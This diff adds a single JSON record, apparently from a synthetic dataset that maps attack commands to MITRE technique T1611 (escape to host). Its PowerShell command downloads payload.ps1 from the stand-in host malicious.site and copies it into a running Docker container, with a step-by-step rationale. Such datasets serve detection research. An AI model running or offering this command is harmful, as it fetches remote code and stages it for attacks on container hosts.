@@ -1,0 +1,21 @@
+{
+  "id": "SYN-POWERSHELL-T1611-49f1bc56-f0db3283",
+  "technique_id": "T1611",
+  "platform": "windows",
+  "shell": "powershell",
+  "command": "Invoke-WebRequest -Uri http://malicious.site/payload.ps1 -OutFile payload.ps1; docker cp payload.ps1 my-running-container:c:\\",
+  "explanation": "Downloads a malicious script and copies it into a running Docker container, which could leverage it to perform actions against the host.",
+  "rationale_steps": [
+    "Retrieve malicious script from external source.",
+    "Utilize Docker's copy functionality to move the script inside the container."
+  ],
+  "source_prompt_hash": "49f1bc56",
+  "obfuscation_level": "none",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  },
+  "timestamp_utc": "2025-07-07T00:31:25.670814Z"
+}
